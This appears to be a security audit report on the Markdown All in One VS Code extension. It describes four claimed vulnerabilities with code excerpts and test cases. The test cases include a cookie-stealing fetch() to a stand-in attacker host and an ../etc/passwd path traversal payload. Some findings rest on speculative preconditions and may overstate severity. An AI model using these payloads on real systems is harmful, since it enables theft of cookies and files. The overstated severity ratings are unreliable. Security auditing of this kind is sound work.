# VULNERABILITIES

## 1. Remote Code Execution Through HTML Export Feature

### Vulnerability Name
Command Injection via HTML Export Script Inclusion

### Description
The Markdown All in One extension contains a severe vulnerability in its HTML export functionality (`print.ts`). When exporting a markdown document to HTML, the extension reads JavaScript files from all installed VS Code extensions that have markdown contributions and directly embeds their contents into the exported HTML file with no sanitization.

Steps to trigger:
1. An attacker creates a malicious repository with a markdown file
2. The repository also contains or references a malicious VS Code extension with markdown contributions
3. When a victim opens the repository and uses the "Print to HTML" feature on the markdown file
4. The extension includes JavaScript from the malicious extension directly in the output HTML
5. When the victim opens the exported HTML file, the malicious code executes in their browser

### Impact
This vulnerability allows for remote code execution in the context of the victim's browser. The attacker can execute arbitrary JavaScript code when the victim opens the exported HTML file, potentially leading to data exfiltration, cookie theft, or further exploitation.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
There is a blacklist of extensions whose scripts should not be included (`Extension_Blacklist` in `markdownExtensions.ts`), but this is not sufficient as it only excludes a few known extensions.

### Missing Mitigations
1. The extension should sanitize or isolate scripts before including them in the HTML output
2. Implement a proper Content Security Policy for the generated HTML
3. Add a user warning when including scripts from extensions
4. Make script inclusion opt-in rather than default behavior

### Preconditions
1. Victim must have the Markdown All in One extension installed
2. Victim must have a malicious extension installed that provides markdown contributions
3. Victim must export a markdown file to HTML using the extension
4. Victim must open the exported HTML file

### Source Code Analysis
The vulnerability exists in `print.ts` within the `getPreviewExtensionScripts()` function:

```typescript
async function getPreviewExtensionScripts() {
    var result = "";
    for (const contribute of mdEngine.contributionsProvider.contributions) {
        if (!contribute.previewScripts || !contribute.previewScripts.length) {
            continue;
        }
        for (const scriptFile of contribute.previewScripts) {
            result += `<script async type="text/javascript">\n/* From extension ${contribute.extensionId} */\n`;
            try {
                result += await fs.promises.readFile(scriptFile.fsPath, { encoding: "utf8" });
            } catch (error) {
                result += "/* Error */";
            }
            result += `\n</script>\n`;
        }
    }
    return result;
}
```

This function reads JavaScript files from extension contributions and directly adds them as inline script tags in the HTML output. The `mdEngine.contributionsProvider.contributions` comes from `markdownExtensions.ts` which collects contributions from all installed extensions:

```typescript
public get contributions() {
    if (!this._cachedContributions) {
        this._cachedContributions = vscode.extensions.all.reduce<IMarkdownContribution[]>((result, extension) => {
            if (Extension_Blacklist.has(extension.id)) {
                return result;
            }
            // Process extension contributions...
        }, []);
    }
    return this._cachedContributions;
}
```

The extension scripts are then embedded in the HTML in the `print()` function:
```typescript
html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>${title ? encodeHTML(title) : ''}</title>
    ${extensionStyles}
    ${getStyles(doc.uri, hasMath, includeVscodeStyles)}
</head>
<body class="vscode-body ${themeClass}">
    ${body}
    ${hasMath ? '<script async src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>' : ''}
    ${extensionScripts}
</body>
</html>`;
```

### Security Test Case
1. Create a malicious VS Code extension that adds markdown contributions with dangerous JavaScript code:
   ```javascript
   {
     "contributes": {
       "markdown.previewScripts": ["malicious.js"]
     }
   }
   ```
   Where `malicious.js` contains:
   ```javascript
   fetch('https://attacker.com/steal?data=' + document.cookie);
   ```

2. Install this extension in the victim's VS Code.

3. Create a simple markdown file:
   ```markdown
   # Test Document
   This is a test.
   ```

4. Export the markdown file to HTML using the "Print to HTML" command.

5. Open the exported HTML file in a browser. The malicious JavaScript will execute, sending the victim's cookies to the attacker's server.

## 2. Path Traversal Leading to File Content Disclosure

### Vulnerability Name
Path Traversal in Image Processing During HTML Export

### Description
When exporting markdown to HTML, the Markdown All in One extension converts image references to base64 data URIs or absolute file paths. The path handling in `relToAbsPath()` function followed by direct file reading allows for directory traversal attacks, potentially enabling an attacker to read arbitrary files on the victim's filesystem.

Steps to trigger:
1. Attacker creates a markdown file with image references containing path traversal sequences
2. Victim opens the malicious markdown file in VS Code
3. Victim uses the "Print to HTML" feature
4. The extension attempts to read files at the traversed path and embeds their contents

### Impact
This vulnerability allows an attacker to read arbitrary files on the victim's system that the VS Code process has access to. This could include sensitive configuration files, credentials, or other personal data.

### Vulnerability Rank
High

### Currently Implemented Mitigations
There is minimal path sanitization applied, but it's insufficient to prevent path traversal attacks.

### Missing Mitigations
1. Proper validation and sanitization of image paths to prevent path traversal
2. Restrict file reading to the workspace or document directory
3. Add a user prompt or warning before converting external file references

### Preconditions
1. Victim must have the Markdown All in One extension installed
2. Victim must open a malicious markdown file with path traversal in image references
3. Victim must use the "Print to HTML" feature on this file
4. The "Convert image paths to data URLs" option must be enabled (default)

### Source Code Analysis
The vulnerability exists in the image processing logic in `print.ts`:

```typescript
body = body.replace(imgTagRegex, function (_, p1, p2, p3) {
    if (p2.startsWith('http') || p2.startsWith('data:')) {
        return _;
    }

    const imgSrc = relToAbsPath(doc.uri, p2);
    try {
        let imgExt = path.extname(imgSrc).slice(1);
        if (imgExt === "jpg") {
            imgExt = "jpeg";
        } else if (imgExt === "svg") {
            imgExt += "+xml";
        }
        const file = fs.readFileSync(imgSrc.replace(/%20/g, '\ ')).toString('base64');
        return `${p1}data:image/${imgExt};base64,${file}${p3}`;
    } catch (e) {
        window.showWarningMessage(localize("ui.general.messageUnableToReadFile", imgSrc) + ` ${localize("ui.exporting.messageRevertingToImagePaths")} (${doc.fileName})`);
    }
    // ...
});
```

The `relToAbsPath()` function doesn't adequately protect against path traversal:

```typescript
function relToAbsPath(resource: Uri, href: string): string {
    if (!href || href.startsWith('http') || path.isAbsolute(href)) {
        return href;
    }

    // Otherwise look relative to the markdown file
    return path.join(path.dirname(resource.fsPath), href);
}
```

While `path.join()` does normalize paths, it doesn't prevent traversal outside the document's directory. The function then uses `fs.readFileSync()` to read the file at that path, which will access any file the VS Code process has permission to read.

### Security Test Case
1. Create a malicious markdown file with an image reference that uses path traversal:
   ```markdown
   # Malicious Document
   
   Look at this image:
   ![sensitive file](../../../../../etc/passwd)
   ```

2. Open this file in VS Code with the Markdown All in One extension installed.

3. Use the "Print to HTML" command to export the document.

4. Examine the exported HTML file. If the vulnerability exists, it will contain a base64-encoded version of the targeted file (/etc/passwd in this example) within an img tag.

## 3. WebAssembly‑based Slugify Module Code Injection Vulnerability

### Vulnerability Name
WebAssembly‑based Slugify Module Code Injection Vulnerability

### Description
The extension customizes markdown header rendering (in `markdownEngine.ts`) by passing raw heading text directly to the `slugify()` function. When the user's configuration selects the Zola mode, `slugify()` (in `slugify.ts`) calls into a WebAssembly module (compiled from the [zola‑slug](https://github.com/yzhang-gh/vscode-markdown/) crate) without performing any extra sanitization, bounds checking, or error handling. A threat actor can supply a specially crafted markdown file (for example, one with extremely long headings or headings containing boundary‑challenging Unicode sequences) so that the input triggers unexpected behavior—such as a memory corruption or buffer overflow—inside the WebAssembly module. Such memory corruption may be exploited for code injection, leading to remote code execution in the VS Code extension host.

### Impact
Successful exploitation would allow an attacker to execute arbitrary code in the context of the VS Code extension host. This may enable access to sensitive files, system credentials, or further privilege escalation on the host system.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension processes markdown content using the standard Markdown‑it engine before passing headings to `slugify()`. However, no custom input sanitization, length checking, or robust error handling (such as try‑catch blocks surrounding the WebAssembly invocation) is applied before calling the module's functions.

### Missing Mitigations
1. Implement strict input sanitization and enforce a maximum allowable heading length before passing the text into the WebAssembly module.
2. Wrap the call to the WebAssembly slugify function with proper try‑catch error handling to ensure that any memory corruption or unexpected errors are safely managed.
3. Consider sandboxing or further hardening the WebAssembly module itself so that even if given malformed input it cannot lead to arbitrary code execution.

### Preconditions
1. The victim must open a markdown file (or repository containing markdown files) that includes maliciously crafted headings designed to trigger the underlying WebAssembly bug.
2. The underlying WebAssembly module compiled from the zola‑slug crate must be vulnerable to input‑induced memory corruption (for example, due to insufficient bounds checking).

### Source Code Analysis
In `markdownEngine.ts`, the function `addNamedHeaders` retrieves the raw heading text from markdown tokens and immediately passes it to the extension's `slugify()` function.

In `slugify.ts`, when the configuration selects `SlugifyMode.Zola`, the code calls
```ts
if (zolaSlug !== undefined) {
  return zolaSlug.slugify(mdInlineToPlainText(rawContent, env));
}
```
without performing extra sanitization or validation on the heading input.

The absence of defensive checks means that an attacker's specially crafted heading may trigger unsafe operations within the WebAssembly module, leading to memory corruption and, ultimately, arbitrary code execution.

### Security Test Case
1. **Preparation:** Create a malicious markdown file (e.g. `malicious.md`) that contains a heading with either an excessively long string or carefully crafted Unicode payload intended to trigger a buffer overflow within the WebAssembly module.
2. **Triggering:** Open this markdown file in VS Code so that the extension processes it (for example, when building the table of contents or rendering a preview).
3. **Observation:** Monitor the VS Code developer console, use debugging tools and memory analysis tools to determine whether the slug generation process crashes, exhibits abnormal behavior, or shows signs of memory corruption.
4. **Confirmation:** If abnormal behavior (e.g. a crash, memory dump, or unexpected output) is observed when processing the malicious heading, this confirms that the vulnerability is present.

## 4. Module Resolution Hijacking in Dynamic Import of "zola‑slug" WebAssembly Module

### Vulnerability Name
Module Resolution Hijacking in Dynamic Import of "zola‑slug" WebAssembly Module

### Description
For the Zola slugification mode, the extension dynamically imports the WebAssembly module by calling
```ts
export async function importZolaSlug() {
  zolaSlug = await import("zola-slug");
}
```
in `slugify.ts`. The module identifier `"zola-slug"` is a bare specifier, which means that Node.js's module resolution algorithm is used without constraining the import to a known, trusted location. A threat actor can supply a malicious version of the `"zola-slug"` module (for instance, by including a manipulated `node_modules/zola-slug` folder in the repository or by setting the `NODE_PATH` environment variable) so that the dynamic import resolves to the attacker‑controlled module. Once loaded, the malicious `zola-slug` module may implement a compromised `slugify()` function that executes arbitrary code during processing of markdown headings, thereby enabling code injection and remote code execution.

### Impact
If exploited, this flaw allows an attacker to hijack the dynamic import process and substitute a malicious module. This may result in arbitrary code execution within the VS Code extension host and could compromise the entire development environment and potentially the underlying system.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
No explicit measures are taken in `slugify.ts` to validate the origin or integrity of the module resolved by the dynamic import. The code does not restrict or verify the module resolution path for `"zola-slug"`.

### Missing Mitigations
1. Enforce module resolution security by bundling the `"zola-slug"` dependency with the extension so that the module is loaded only from a trusted, fixed location (for example, by using a bundler or an absolute path).
2. Implement integrity checks (such as verifying a hash of the module's code) to ensure that the imported module has not been tampered with.
3. Limit external influence on module resolution (for example, by sanitizing or ignoring environment variables like `NODE_PATH` that might alter the module search path).

### Preconditions
1. The extension must not be statically bundled with its dependencies so that the dynamic import of `"zola-slug"` is subject to Node.js's default module resolution.
2. The attacker must be able to introduce a malicious version of `"zola-slug"` via the workspace (for instance, by providing a manipulated repository with its own `node_modules`) or influence the module resolution environment.

### Source Code Analysis
In `slugify.ts`, a module‐scoped variable is declared without specifying an absolute path:
```ts
let zolaSlug: typeof import("zola-slug");
```

The function `importZolaSlug()` then calls the dynamic import using a bare module specifier. Because Node.js's resolution algorithm is used, the lookup order may be influenced by the workspace's `node_modules` or environment variables such as `NODE_PATH`.

There is no check to confirm that the resolved module originates from the expected and trusted location, leaving open the possibility of module resolution hijacking by an attacker.

### Security Test Case
1. **Setup Malicious Module:** Create a malicious repository that includes a `node_modules/zola-slug` folder containing an altered implementation of the `slugify()` function (for example, one that runs a shell command or writes sensitive data to disk).
2. **Environment Manipulation:** Configure the workspace or adjust environment variables (such as `NODE_PATH`) so that the dynamic import in the extension prioritizes the repository's version of `"zola-slug"` over the intended trusted module.
3. **Trigger Import:** Open a markdown file that causes the extension to invoke the slugification process (e.g. by generating the table of contents), which in turn triggers a call to `importZolaSlug()`.
4. **Observe Effects:** Monitor the behavior of the extension and system logs to determine whether the malicious payload is executed. Successful execution of the payload confirms that the module resolution hijacking vulnerability is valid.